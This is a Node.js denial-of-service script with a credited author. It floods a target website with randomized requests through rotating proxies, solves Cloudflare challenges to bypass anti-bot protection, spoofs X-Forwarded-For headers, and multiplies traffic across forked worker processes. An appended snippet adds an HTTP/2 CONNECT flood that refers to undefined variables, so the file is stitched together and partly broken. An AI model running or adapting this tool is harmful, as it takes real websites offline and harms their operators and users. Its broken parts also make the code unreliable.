const EventEmitter = require('events').EventEmitter;
const cloudscraper = require('cloudscraper');
const path = require('path');
const fs = require('fs').promises;
const randomUserAgent = require('random-useragent');
const cryptoRandomString = require('crypto-random-string');
const cluster = require('cluster');
const https = require('https');
const http2 = require('http2');
const url = require('url');

EventEmitter.defaultMaxListeners = 0;

function randomNumber(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function printUsage() {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <connectPerThread> <proxies> <thread>
Usage: node ${path.basename(__filename)} <https://example.com> <60> <250> <proxy.txt> <1>
                                                    By: Stret
`);
}

async function readProxiesFile(file) {
    try {
        const content = await fs.readFile(file, 'utf-8');
        return content.replace(/\r/gi, '').split('\n').filter(Boolean);
    } catch (err) {
        console.error(`Error reading proxies file: ${err.message}`);
        throw err;
    }
}

async function sendRequest() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const proxiedRequest = cloudscraper.defaults({ proxy: `http://${proxy}` }, { proxy: `https://${proxy}` });
    const data = '?' + cryptoRandomString({ length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' })
        + '=' + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
        + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
        + cryptoRandomString({ length: 8 }) + '&' + cryptoRandomString({ length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' })
        + '=' + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
        + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
        + cryptoRandomString({ length: 8 });

    const options = {
        method: 'GET',
        cloudflareTimeout: 10000,
        cloudflareMaxTimeout: 10000,
        challengesToSolve: 20,
        resolveWithFullResponse: true,
        headers: {
            ...headerbuilders,
            'User-Agent': randomUserAgent.getRandom(),
            'X-Forwarded-For': `${randomNumber(1, 555)}.${randomNumber(1, 555)}.${randomNumber(1, 555)}.${randomNumber(1, 555)}`,
        },
        uri: target + data,
        data: data,
        agent: new https.Agent({
            rejectUnauthorized: false,
        }),
    };

    try {
        const response = await proxiedRequest(options);
        console.log("BYPASS_PACKET_SEND");

        for (let i = 0; i < perthreads; ++i) {
            try {
                await proxiedRequest(options);
                console.log("REQ_PACKET_SENDED: ", i);
            } catch (err) {
                // Handle error for individual thread request
            }
        }
    } catch (err) {
        // Handle error for the main request
    }
}

function run() {
    setInterval(() => {
        sendRequest();
    });
}

function startCluster() {
    if (cluster.isMaster) {
        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }
        cluster.on('exit', (worker, code, signal) => {
            console.log(`Threads: ${worker.process.pid} ended`);
        });
    } else {
        run();
        console.log(`Threads: ${process.pid} started`);
    }
}

function endAttack() {
    setTimeout(() => {
        console.log('Attack ended.');
        process.exit(0);
    }, time * 1000);
}

function handleErrors() {
    process.on('uncaughtException', function (err) {
        console.error(err);
    });

    process.on('unhandledRejection', function (err) {
        console.error(err);
    });
}

async function main() {
    try {
        printUsage();
        proxies = await readProxiesFile(fileproxy);
        startCluster();
        endAttack();
        handleErrors();
    } catch (err) {
        console.error(`Error starting the application: ${err.message}`);
        process.exit(1);
    }
}

let target, time, fileproxy, threads, perthreads, proxies;

if (process.argv.length !== 7) {
    printUsage();
    process.exit(0);
} else {
    target = process.argv[2];
    time = process.argv[3];
    fileproxy = process.argv[5];
    threads = process.argv[6];
    perthreads = process.argv[4];
}

main();

// Your provided code snippet
const req = https.request({
    method: 'CONNECT',
    host: target,
    port: 443,
});

req.on('connect', function (res, socket, head) {
    const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
            host: parsed.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsed.host,
            challengesToSolve: 5,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            maxRedirects: 20,
            followAllRedirects: true,
            decodeEmails: false,
            gzip: true,
            servername: parsed.host,
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
            socket: socket,
        }, function () {
            for (let i = 0; i < rate; i++) {
                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%", ra())}`;
                headerbuilders["X-Forwarded-For"] = spoof();
                headerbuilders["Cookie"].replace("%RAND%", ra());
		const req = client.request(headerbuilders);
                req.end();
                req.on("response", () => {
                    req.close();
                });
            }
        })
    });
});
req.end();
    
               
